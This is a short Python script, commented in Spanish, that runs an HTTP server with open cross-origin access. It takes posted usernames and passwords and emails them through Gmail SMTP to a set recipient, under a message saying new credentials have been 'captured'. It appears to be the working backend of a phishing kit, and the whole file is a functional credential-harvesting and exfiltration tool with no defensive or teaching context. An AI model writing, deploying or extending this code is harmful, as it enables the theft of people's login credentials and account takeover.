import json
import smtplib
import os
from email.mime.text import MIMEText
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ================= CONFIGURACIÓN DE CORREO =================
REMITENTE = os.environ.get('REMITENTE')
CONTRASENA_APP = os.environ.get('CONTRASENA_APP')
DESTINATARIO = os.environ.get('DESTINATARIO')
# ===========================================================

class ServidorLocal(BaseHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Servidor API funcionando correctamente")

    def do_POST(self):
        try:
            longitud = int(self.headers.get('Content-Length', 0))
            if longitud == 0:
                self.send_response(400)
                self.end_headers()
                return
                
            datos_crudos = self.rfile.read(longitud)
            datos = json.loads(datos_crudos.decode('utf-8'))

            usuario = datos.get('username', '')
            contrasena = datos.get('password', '')

            cuerpo_mensaje = f"Se han capturado nuevas credenciales:\n\nUsuario: {usuario}\nContraseña: {contrasena}"
            msg = MIMEText(cuerpo_mensaje)
            msg['Subject'] = 'Datos del Formulario Local'
            msg['From'] = REMITENTE
            msg['To'] = DESTINATARIO

            print("Conectando al servidor de correo...", flush=True)
            
            servidor_smtp = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
            servidor_smtp.login(REMITENTE, CONTRASENA_APP)
            servidor_smtp.send_message(msg)
            servidor_smtp.quit()
            
            print(f"¡Correo enviado con éxito! (Usuario: {usuario})", flush=True)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            
        except Exception as e:
            print(f"Error procesando POST: {e}", flush=True)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode('utf-8'))

puerto = int(os.environ.get('PORT', 8000))
print(f"Servidor Python escuchando en el puerto {puerto}...")
ThreadingHTTPServer(('0.0.0.0', puerto), ServidorLocal).serve_forever()